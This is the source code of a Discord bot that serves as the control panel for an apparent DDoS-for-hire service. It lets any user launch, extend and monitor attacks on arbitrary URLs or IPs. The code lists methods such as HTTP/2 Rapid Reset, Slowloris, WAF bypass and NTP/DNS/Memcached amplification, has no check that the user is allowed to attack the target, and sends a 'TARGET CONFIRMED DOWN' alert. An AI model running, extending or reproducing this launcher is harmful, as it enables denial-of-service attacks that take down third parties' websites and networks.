import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChatInputCommandInteraction,
  StringSelectMenuInteraction,
  Message,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ComponentType,
  Events,
} from "discord.js";
import { BOT_TOKEN, APPLICATION_ID, GUILD_ID, COLORS, AUTHOR } from "./config.js";
import { api } from "./api.js";
import {
  buildAttackEmbed,
  buildStartEmbed,
  buildStopEmbed,
  buildListEmbed,
  buildStatsEmbed,
  buildAnalyzeEmbed,
  buildMethodsEmbed,
  buildHelpEmbed,
  buildErrorEmbed,
  type ProbeResult,
} from "./embeds.js";

if (!BOT_TOKEN) {
  console.error("❌ DISCORD_BOT_TOKEN is not set. Set it in the environment variables.");
  process.exit(1);
}

// ── Method definitions with layer grouping for the select menu ──────────────
const METHOD_OPTIONS = [
  // ── Geass / Special ────────────────────────────────────────────────────
  { value: "geass-override",      label: "👁️ Geass Override ∞",           description: "MAX POWER — 14 vectors (ARES): H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+CACHE+TLS+QUIC+SSL+HTTPBypass...", emoji: "👁️" },
  // ── L7 Application ─────────────────────────────────────────────────────
  { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",         description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",        emoji: "🟣" },
  { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",          description: "CVE-2023-44487 — 64-stream RST burst, millions req/s",                emoji: "⚡" },
  { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)", description: "CVE-2024-27316 — endless CONTINUATION frames, server OOM",           emoji: "💀" },
  { value: "hpack-bomb",          label: "🧨 HPACK Bomb (RFC 7541)",      description: "Incremental-indexed headers → HPACK table eviction storm — no CVE, no fix", emoji: "🧨" },
  { value: "h2-settings-storm",   label: "🌊 H2 Settings Storm",          description: "SETTINGS HPACK oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain", emoji: "🌊" },
  { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",       description: "Holds thousands of WS conns open — goroutine/thread per conn",        emoji: "🕸️" },
  { value: "graphql-dos",         label: "🔮 GraphQL Introspection DoS",   description: "Nested queries O(N^15) + alias bombs + batched introspection",        emoji: "🔮" },
  { value: "cache-poison",        label: "☠️ CDN Cache Poisoning DoS",    description: "Fills CDN cache with unique keys — 100% origin miss rate eviction",   emoji: "☠️" },
  { value: "slowloris",           label: "🐌 Slowloris",                  description: "25K half-open connections — starves nginx/apache thread pool",         emoji: "🐌" },
  { value: "conn-flood",          label: "🔗 TLS Connection Flood",        description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",        emoji: "🔗" },
  { value: "tls-renego",          label: "🔐 TLS Renegotiation DoS",      description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn",    emoji: "🔐" },
  { value: "rudy",                label: "🩸 R.U.D.Y (SlowPOST)",         description: "Claims 1GB body, sends 1 byte/5s — holds server threads forever",    emoji: "🩸" },
  { value: "rudy-v2",             label: "🩸 RUDY v2 — Multipart POST",   description: "multipart/form-data + 70-char boundary — harder to detect than RUDY", emoji: "🩸" },
  { value: "http-flood",          label: "🌊 HTTP Flood",                  description: "High-volume HTTP GET — overwhelms web server resources",              emoji: "🌊" },
  { value: "http-bypass",         label: "🛡️ HTTP Bypass",               description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN bot detection", emoji: "🛡️" },
  // ── L4 Transport ───────────────────────────────────────────────────────
  { value: "quic-flood",          label: "⚡ QUIC/HTTP3 Flood (RFC 9000)", description: "QUIC Initial packets — server allocates crypto state per DCID → OOM", emoji: "⚡" },
  { value: "ssl-death",           label: "💀 SSL Death Record",            description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU",        emoji: "💀" },
  { value: "udp-flood",           label: "💥 UDP Flood",                  description: "Raw UDP packet flood — saturates L4 bandwidth",                       emoji: "💥" },
  { value: "udp-bypass",          label: "🔀 UDP Bypass",                 description: "UDP flood with randomized payloads to evade rate limiting",            emoji: "🔀" },
  { value: "syn-flood",           label: "🔌 SYN Flood",                  description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake",       emoji: "🔌" },
  { value: "tcp-flood",           label: "📡 TCP Flood",                  description: "Raw TCP packet flood against open ports",                              emoji: "📡" },
  // ── L3 Amplification ───────────────────────────────────────────────────
  { value: "ntp-amp",             label: "🕐 NTP Amplification [556x]",   description: "Monlist NTP abuse — 556× amplification factor",                       emoji: "🕐" },
  { value: "dns-amp",             label: "📛 DNS Amplification [54x]",    description: "Open resolver abuse — 54× amplification factor",                      emoji: "📛" },
  { value: "mem-amp",             label: "💾 Memcached [51000x]",         description: "Exposed Memcached — up to 51,000× amplification",                     emoji: "💾" },
];

// ── Duration presets ─────────────────────────────────────────────────────────
const DURATION_OPTIONS = [
  { value: "30",   label: "30 seconds",   description: "Quick burst test" },
  { value: "60",   label: "1 minute",     description: "Standard attack (default)" },
  { value: "120",  label: "2 minutes",    description: "Extended pressure" },
  { value: "300",  label: "5 minutes",    description: "Sustained assault" },
  { value: "600",  label: "10 minutes",   description: "Maximum duration" },
];

// ── Thread presets ───────────────────────────────────────────────────────────
const THREAD_OPTIONS = [
  { value: "50",   label: "50 threads",   description: "Low — test only" },
  { value: "100",  label: "100 threads",  description: "Medium" },
  { value: "200",  label: "200 threads",  description: "High (default)" },
  { value: "500",  label: "500 threads",  description: "Very High" },
  { value: "1000", label: "1000 threads", description: "Maximum" },
];

// ── Pending launcher sessions (userId → { target, duration, threads }) ───────
interface LaunchSession { target: string; duration: number; threads: number; }
const pendingSessions = new Map<string, LaunchSession>();

// ── Slash Command Definitions ─────────────────────────────────────────────────
const COMMANDS = [
  new SlashCommandBuilder()
    .setName("attack")
    .setDescription("⚔️ Geass Attack Control — launch, stop, and monitor attacks")
    .addSubcommand(sub =>
      sub.setName("start")
        .setDescription("🔴 Launch a new Geass command — opens method/duration/thread selector")
        .addStringOption(opt =>
          opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("stop")
        .setDescription("⏹️ Stop a running attack by ID")
        .addIntegerOption(opt =>
          opt.setName("id").setDescription("Attack ID to stop").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 List all active and recent attacks")
    )
    .addSubcommand(sub =>
      sub.setName("stats")
        .setDescription("📊 Show global aggregate attack statistics")
    ),

  new SlashCommandBuilder()
    .setName("analyze")
    .setDescription("🔍 Analyze a target and get vulnerability recommendations")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP to analyze").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("methods")
    .setDescription("⚡ List all available attack vectors")
    .addStringOption(opt =>
      opt.setName("layer")
        .setDescription("Filter by network layer")
        .setRequired(false)
        .addChoices(
          { name: "L7 — Application layer (HTTP, HTTP/2, Slowloris)", value: "L7" },
          { name: "L4 — Transport layer (TCP, UDP, SYN)",             value: "L4" },
          { name: "L3 — Network layer (ICMP, amplification)",         value: "L3" },
        )
    ),

  new SlashCommandBuilder()
    .setName("help")
    .setDescription("❓ Show Lelouch Britannia command guide"),

  new SlashCommandBuilder()
    .setName("geass")
    .setDescription("👁️ Launch Geass Override ∞ — ARES maximum power, 14 simultaneous vectors")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
    )
    .addIntegerOption(opt =>
      opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
    )
    .addIntegerOption(opt =>
      opt.setName("threads").setDescription("Base thread count (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
    ),
].map(c => c.toJSON());

// ── Deploy slash commands ─────────────────────────────────────────────────────
async function deployCommands(): Promise<void> {
  const rest = new REST().setToken(BOT_TOKEN);
  try {
    console.log("📡 Registering slash commands to guild (instant)...");
    await rest.put(Routes.applicationGuildCommands(APPLICATION_ID, GUILD_ID), { body: COMMANDS });
    console.log(`✅ Registered ${COMMANDS.length} slash commands to guild ${GUILD_ID}.`);
  } catch (err) {
    console.error("❌ Failed to register commands:", err);
    throw err;
  }
}

// ── Target probe helper ───────────────────────────────────────────────────────
async function probeTarget(rawUrl: string): Promise<ProbeResult> {
  let url = rawUrl.trim();
  if (!/^https?:\/\//i.test(url)) url = `https://${url}`;
  const t0 = Date.now();
  try {
    // 5s timeout — must be less than INTERVAL_SEC to prevent stacking
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const res   = await fetch(url, {
      method:   "GET",
      redirect: "follow",
      signal:   ctrl.signal,
      headers:  {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control":   "no-cache",
      },
    });
    clearTimeout(timer);
    const latencyMs = Date.now() - t0;
    if (res.status >= 500) {
      return { up: false, latencyMs, reason: `HTTP ${res.status} — origin server error` };
    }
    if (res.status === 429) {
      // 429 = server is alive but ratelimiting — count as UP (degraded)
      return { up: true, latencyMs: latencyMs + 5000, reason: `HTTP 429 — rate limiter hit (server alive, fighting back)` };
    }
    return { up: true, latencyMs };
  } catch (err: unknown) {
    const latencyMs = Date.now() - t0;
    const msg = err instanceof Error ? err.message : String(err);

    // ECONNREFUSED = server actively rejected → definitely crashed
    if (msg.includes("ECONNREFUSED") || msg.includes("refused")) {
      return { up: false, latencyMs, reason: "Connection refused — server process crashed" };
    }
    // ENOTFOUND/NXDOMAIN = DNS gone → target unreachable
    if (msg.includes("ENOTFOUND") || msg.includes("NXDOMAIN")) {
      return { up: false, latencyMs, reason: "DNS resolution failed — target unreachable" };
    }
    // AbortError = our probe timed out (may be our network saturated or target slow)
    if (msg.includes("abort") || msg.includes("AbortError") || msg.includes("The operation was aborted")) {
      // Treat as degraded but NOT confirmed down — attack traffic may saturate our own outbound
      return { up: true, latencyMs: 5001, reason: "Probe timed out — target slow or our network saturated" };
    }
    // ECONNRESET = TCP RST received (can be our side too under load)
    if (msg.includes("ECONNRESET") || msg.includes("reset")) {
      return { up: true, latencyMs: 4500, reason: "Connection reset — possible overflow (check site)" };
    }
    // Generic "fetch failed" / "TypeError" = our network stack is overwhelmed by attack traffic
    // Do NOT count as target DOWN — this is a probe false positive during heavy attacks
    return { up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" };
  }
}

// ── Live attack monitor ───────────────────────────────────────────────────────
const monitors        = new Map<number, NodeJS.Timeout>();
const prevPackets     = new Map<number, number>();
const targetHistories = new Map<number, ProbeResult[]>();
const downAlertSent   = new Map<number, boolean>(); // prevent DM spam

// Module-level client ref (set in main()) for DM support
let botClient: Client | null = null;

function buildAttackButtons(attackId: number, running: boolean): ActionRowBuilder<ButtonBuilder> {
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`stop_${attackId}`)
      .setLabel("⏹️ Stop Attack")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(!running),
    new ButtonBuilder()
      .setCustomId(`extend_${attackId}`)
      .setLabel("⏱️ Extend +60s")
      .setStyle(ButtonStyle.Primary)
      .setDisabled(!running),
  );
}

function startMonitor(attackId: number, msg: Message, target: string, userId?: string): void {
  if (monitors.has(attackId)) return;
  const INTERVAL_MS = 7_000;
  targetHistories.set(attackId, []);
  downAlertSent.set(attackId, false);
  let busy = false;

  const tick = setInterval(async () => {
    if (busy) return;
    busy = true;
    try {
      const [attack, live, probe] = await Promise.all([
        api.getAttack(attackId),
        api.getLiveConns(attackId).catch(() => ({ conns: 0, running: false })),
        probeTarget(target).catch(() => ({ up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" } as ProbeResult)),
      ]);

      if (!attack) {
        clearInterval(tick);
        monitors.delete(attackId);
        prevPackets.delete(attackId);
        targetHistories.delete(attackId);
        downAlertSent.delete(attackId);
        return;
      }

      const history = targetHistories.get(attackId) ?? [];
      history.push(probe);
      if (history.length > 30) history.shift();
      targetHistories.set(attackId, history);

      const prev    = prevPackets.get(attackId) ?? attack.packetsSent;
      const delta   = Math.max(0, attack.packetsSent - prev);
      const livePps = delta / (INTERVAL_MS / 1000);
      prevPackets.set(attackId, attack.packetsSent);

      const isRunning = attack.status === "running";
      const row       = buildAttackButtons(attackId, isRunning);

      try {
        await msg.edit({
          embeds:     [buildAttackEmbed(attack, livePps, live?.conns ?? 0, history)],
          components: [row],
        });
      } catch { /**/ }

      // ── DM alert when target goes definitively DOWN ─────────────────────
      if (
        userId &&
        botClient &&
        !downAlertSent.get(attackId) &&
        !probe.up &&
        (probe.reason?.includes("refused") || probe.reason?.includes("DNS") || probe.reason?.includes("ENOTFOUND") || probe.reason?.includes("ECONNREFUSED"))
      ) {
        downAlertSent.set(attackId, true);
        try {
          const user = await botClient.users.fetch(userId);
          await user.send({
            embeds: [
              new EmbedBuilder()
                .setColor(COLORS.RED)
                .setTitle("💀 TARGET CONFIRMED DOWN")
                .setDescription(
                  `> *"All opposition shall submit to the might of Geass."*\n\n` +
                  `**Attack #${attackId}** — \`${target}\` has gone **DOWN**.`
                )
                .addFields(
                  { name: "🎯 Target",   value: `\`${target}\``,             inline: true },
                  { name: "⚔️ Method",   value: `\`${attack.method}\``,      inline: true },
                  { name: "💀 Reason",   value: probe.reason ?? "ECONNREFUSED", inline: false },
                )
                .setFooter({ text: AUTHOR })
                .setTimestamp(),
            ],
          });
        } catch { /* DM may be blocked by user privacy settings */ }
      }

      if (!isRunning) {
        clearInterval(tick);
        monitors.delete(attackId);
        prevPackets.delete(attackId);
        setTimeout(() => { targetHistories.delete(attackId); downAlertSent.delete(attackId); }, 30_000);
      }
    } finally { busy = false; }
  }, INTERVAL_MS);
  monitors.set(attackId, tick);
}

// ── Build launcher embed with all 3 dropdowns ─────────────────────────────────
function buildLauncherComponents(target: string) {
  // Row 1 — Method select (max 25 options)
  const methodMenu = new StringSelectMenuBuilder()
    .setCustomId("select_method")
    .setPlaceholder("⚔️ Choose attack method...")
    .addOptions(
      METHOD_OPTIONS.map(m =>
        new StringSelectMenuOptionBuilder()
          .setValue(m.value)
          .setLabel(m.label)
          .setDescription(m.description.slice(0, 100))
      )
    );

  // Row 2 — Duration select
  const durationMenu = new StringSelectMenuBuilder()
    .setCustomId("select_duration")
    .setPlaceholder("⏱ Duration (default: 60s)")
    .addOptions(
      DURATION_OPTIONS.map(d =>
        new StringSelectMenuOptionBuilder()
          .setValue(d.value)
          .setLabel(d.label)
          .setDescription(d.description)
      )
    );

  // Row 3 — Thread select
  const threadMenu = new StringSelectMenuBuilder()
    .setCustomId("select_threads")
    .setPlaceholder("🧵 Threads (default: 200)")
    .addOptions(
      THREAD_OPTIONS.map(t =>
        new StringSelectMenuOptionBuilder()
          .setValue(t.value)
          .setLabel(t.label)
          .setDescription(t.description)
      )
    );

  return [
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenu),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(durationMenu),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(threadMenu),
  ];
}

function buildLauncherEmbed(target: string, session: LaunchSession, selectedMethod?: string): EmbedBuilder {
  const mInfo = selectedMethod ? METHOD_OPTIONS.find(m => m.value === selectedMethod) : null;
  return new EmbedBuilder()
    .setColor(COLORS.GOLD)
    .setTitle("⚔️ GEASS LAUNCHER — Configure Attack")
    .setDescription(
      mInfo
        ? `**${mInfo.label}** selected — configure duration & threads, then click **🚀 LAUNCH**`
        : "Select an **attack method**, then optionally change duration & threads.\nClick **🚀 LAUNCH** when ready."
    )
    .addFields(
      { name: "🎯 Target",    value: `\`${target}\``,                                     inline: false },
      { name: "⚔️ Method",   value: mInfo ? `**${mInfo.label}**` : "_not selected yet_",  inline: true  },
      { name: "⏱ Duration",  value: `**${session.duration}s**`,                           inline: true  },
      { name: "🧵 Threads",  value: `**${session.threads}**`,                             inline: true  },
      { name: "\u200b",      value: "Select method above, then press **🚀 LAUNCH**.",      inline: false },
    )
    .setFooter({ text: AUTHOR })
    .setTimestamp();
}

// ── Command Handlers ──────────────────────────────────────────────────────────
async function handleAttackStart(interaction: ChatInputCommandInteraction): Promise<void> {
  const target  = interaction.options.getString("target", true);
  const userId  = interaction.user.id;

  // Init session with defaults
  const session: LaunchSession = { target, duration: 60, threads: 200 };
  pendingSessions.set(userId, session);

  const components = buildLauncherComponents(target);
  // Row 4 — Launch + Cancel buttons
  const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("launch_attack")
      .setLabel("🚀 LAUNCH")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(true), // disabled until method is chosen
    new ButtonBuilder()
      .setCustomId("cancel_launch")
      .setLabel("✖ Cancel")
      .setStyle(ButtonStyle.Secondary),
  );

  await interaction.reply({
    embeds: [buildLauncherEmbed(target, session)],
    components: [...components, buttonRow],
    ephemeral: false,
  });
}

async function handleAttackStop(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const id = interaction.options.getInteger("id", true);
  console.log(`[ATTACK STOP] ${interaction.user.tag} → #${id}`);
  try {
    const result = await api.stopAttack(id);
    const ok     = result?.ok ?? false;
    const timer  = monitors.get(id);
    if (timer) { clearInterval(timer); monitors.delete(id); }
    await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
    console.log(`[ATTACK #${id}] ${ok ? "Stopped" : "Stop failed"}`);
  } catch {
    await interaction.editReply({ embeds: [buildStopEmbed(id, false)] });
  }
}

async function handleAttackList(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const attacks = await api.getAttacks();
    await interaction.editReply({ embeds: [buildListEmbed(attacks)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("FETCH FAILED", message)] });
  }
}

async function handleAttackStats(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const stats = await api.getStats();
    await interaction.editReply({ embeds: [buildStatsEmbed(stats)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("STATS FAILED", message)] });
  }
}

async function handleAnalyze(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target = interaction.options.getString("target", true);
  console.log(`[ANALYZE] ${interaction.user.tag} → ${target}`);
  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle("🔍 SCANNING TARGET...")
        .setDescription(`Analyzing \`${target}\`\nRunning DNS probes, HTTP fingerprinting, CDN detection...`)
        .setFooter({ text: AUTHOR })
    ],
  });
  try {
    const result = await api.analyze(target);
    await interaction.editReply({ embeds: [buildAnalyzeEmbed(result)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("ANALYSIS FAILED", message)] });
  }
}

async function handleMethods(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const layerFilter = interaction.options.getString("layer") ?? undefined;
  try {
    const methods = await api.getMethods();
    await interaction.editReply({ embeds: [buildMethodsEmbed(methods, layerFilter)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("METHODS FAILED", message)] });
  }
}

async function handleHelp(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({ embeds: [buildHelpEmbed()] });
}

async function handleGeass(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target   = interaction.options.getString("target", true);
  const duration = interaction.options.getInteger("duration") ?? 60;
  const threads  = interaction.options.getInteger("threads")  ?? 200;
  const isHttps  = /^https:/i.test(target);
  const port     = isHttps ? 443 : 80;
  console.log(`[GEASS] ${interaction.user.tag} → ${target} | ${threads}t | ${duration}s`);

  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.CRIMSON)
        .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
        .setDescription(
          `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
          `👁️ **GEASS OVERRIDE — ARES OMNIVECT** — 13 simultaneous vectors against \`${target}\`\n` +
          `**ConnFlood → Slowloris → H2RST → H2CONT → HPACK Bomb → WAF Bypass → WS → GQL → RUDY v2 → Cache Poison → TLS Renego → QUIC → SSL Death**`
        )
        .addFields(
          { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
          { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
          { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
          { name: "📊 Status",   value: "🔴 **INITIALIZING 13 VECTORS — ARES COMMAND...**", inline: false },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp()
    ],
  });

  try {
    const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
    console.log(`[GEASS #${attack.id}] 10 Vectors online → ${target}`);
    const row     = buildAttackButtons(attack.id, true);
    const msg     = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
    const userId  = interaction.user.id;
    startMonitor(attack.id, msg as Message, target, userId);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("GEASS FAILED", message)] });
  }
}

// ── Select Menu Handler ───────────────────────────────────────────────────────
async function handleSelectMenu(interaction: StringSelectMenuInteraction): Promise<void> {
  const userId  = interaction.user.id;
  const session = pendingSessions.get(userId);
  if (!session) { await interaction.deferUpdate(); return; }

  const value = interaction.values[0];

  if (interaction.customId === "select_method") {
    // Update selected method label in session (store in a parallel map)
    pendingMethodMap.set(userId, value);
  } else if (interaction.customId === "select_duration") {
    session.duration = parseInt(value, 10);
    pendingSessions.set(userId, session);
  } else if (interaction.customId === "select_threads") {
    session.threads = parseInt(value, 10);
    pendingSessions.set(userId, session);
  }

  const currentMethod = pendingMethodMap.get(userId);

  // Rebuild components with Launch button enabled if method is selected
  const components = buildLauncherComponents(session.target);
  const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("launch_attack")
      .setLabel("🚀 LAUNCH")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(!currentMethod), // enabled once method is chosen
    new ButtonBuilder()
      .setCustomId("cancel_launch")
      .setLabel("✖ Cancel")
      .setStyle(ButtonStyle.Secondary),
  );

  await interaction.update({
    embeds: [buildLauncherEmbed(session.target, session, currentMethod)],
    components: [...components, buttonRow],
  });
}

// Track selected method separately (not in LaunchSession to keep it clean)
const pendingMethodMap = new Map<string, string>();

// ── Button Interaction Handler ────────────────────────────────────────────────
async function handleButton(interaction: import("discord.js").ButtonInteraction): Promise<void> {
  const { customId } = interaction;

  // ── Launch button ─────────────────────────────────────────────────────────
  if (customId === "launch_attack") {
    const userId  = interaction.user.id;
    const session = pendingSessions.get(userId);
    const method  = pendingMethodMap.get(userId);
    if (!session || !method) {
      await interaction.reply({ content: "❌ Session expired. Run `/attack start` again.", ephemeral: true });
      return;
    }
    pendingSessions.delete(userId);
    pendingMethodMap.delete(userId);

    await interaction.deferUpdate();

    // Disable all components while launching
    await interaction.editReply({ components: [] });

    const { target, duration, threads } = session;
    const isHttps = /^https:/i.test(target);
    const port    = isHttps ? 443 : 80;

    console.log(`[ATTACK START] ${interaction.user.tag} → ${target} | ${method} | ${threads}t | ${duration}s`);

    try {
      const attack  = await api.startAttack({ target, method, threads, duration, port });
      const row     = buildAttackButtons(attack.id, true);
      const msg     = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
      const userId  = interaction.user.id;
      console.log(`[ATTACK #${attack.id}] Started — ${method} → ${target}`);
      startMonitor(attack.id, msg as Message, target, userId);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("ATTACK FAILED", message)], components: [] });
    }
    return;
  }

  // ── Cancel button ─────────────────────────────────────────────────────────
  if (customId === "cancel_launch") {
    const userId = interaction.user.id;
    pendingSessions.delete(userId);
    pendingMethodMap.delete(userId);
    await interaction.update({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.GRAY)
          .setTitle("✖ Launch Cancelled")
          .setDescription("The attack was cancelled.")
          .setFooter({ text: AUTHOR }),
      ],
      components: [],
    });
    return;
  }

  // ── Stop button ───────────────────────────────────────────────────────────
  if (customId.startsWith("stop_")) {
    const id = parseInt(customId.slice(5), 10);
    await interaction.deferReply({ ephemeral: true });
    try {
      const result = await api.stopAttack(id);
      const ok     = result?.ok ?? false;
      const timer  = monitors.get(id);
      if (timer) { clearInterval(timer); monitors.delete(id); }
      await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
      console.log(`[BUTTON] ${interaction.user.tag} stopped attack #${id}`);
    } catch {
      await interaction.editReply({ embeds: [buildStopEmbed(id, false)] });
    }
    return;
  }

  // ── Extend +60s button ────────────────────────────────────────────────────
  if (customId.startsWith("extend_")) {
    const id = parseInt(customId.slice(7), 10);
    await interaction.deferReply({ ephemeral: true });
    try {
      const result = await api.extendAttack(id, 60);
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GOLD)
            .setTitle("⏱️ ATTACK EXTENDED")
            .setDescription(`Attack **#${id}** extended by **+60 seconds**.\nNew total duration: **${result.duration}s**`)
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
      });
      console.log(`[BUTTON] ${interaction.user.tag} extended attack #${id} +60s`);
    } catch {
      await interaction.editReply({
        embeds: [buildErrorEmbed("EXTEND FAILED", "Attack may have already finished.")],
      });
    }
    return;
  }
}

// ── Main ──────────────────────────────────────────────────────────────────────
async function main(): Promise<void> {
  await deployCommands();

  const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages] });
  botClient = client; // make accessible for DM alerts

  client.once(Events.ClientReady, c => {
    console.log(`\n╔════════════════════════════════════════╗`);
    console.log(`║   👁️  LELOUCH BRITANNIA — ONLINE        ║`);
    console.log(`║   Bot: ${c.user.tag.padEnd(32)} ║`);
    console.log(`║   Servers: ${String(c.guilds.cache.size).padEnd(28)} ║`);
    console.log(`╚════════════════════════════════════════╝\n`);
    console.log(`${AUTHOR}`);
    c.user.setPresence({
      activities: [{ name: "⚔️ /attack start — Choose your vector" }],
      status: "online",
    });
  });

  client.on(Events.InteractionCreate, async interaction => {
    try {
      if (interaction.isStringSelectMenu()) {
        await handleSelectMenu(interaction as StringSelectMenuInteraction);
        return;
      }

      if (interaction.isButton()) {
        await handleButton(interaction as import("discord.js").ButtonInteraction);
        return;
      }

      if (!interaction.isChatInputCommand()) return;

      const { commandName } = interaction;

      if (commandName === "attack") {
        const sub = interaction.options.getSubcommand();
        if (sub === "start")      await handleAttackStart(interaction);
        else if (sub === "stop")  await handleAttackStop(interaction);
        else if (sub === "list")  await handleAttackList(interaction);
        else if (sub === "stats") await handleAttackStats(interaction);
      } else if (commandName === "analyze") {
        await handleAnalyze(interaction);
      } else if (commandName === "methods") {
        await handleMethods(interaction);
      } else if (commandName === "help") {
        await handleHelp(interaction);
      } else if (commandName === "geass") {
        await handleGeass(interaction);
      }
    } catch (err) {
      console.error("[INTERACTION ERROR]", err);
      try {
        const errEmbed = buildErrorEmbed("INTERNAL ERROR", "An unexpected error occurred. Please try again.");
        if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
          await interaction.reply({ embeds: [errEmbed], ephemeral: true });
        }
      } catch { /**/ }
    }
  });

  client.on(Events.Error, err => {
    console.error("[CLIENT ERROR]", err);
  });

  await client.login(BOT_TOKEN);
}

main().catch(err => {
  console.error("Fatal error:", err);
  process.exit(1);
});
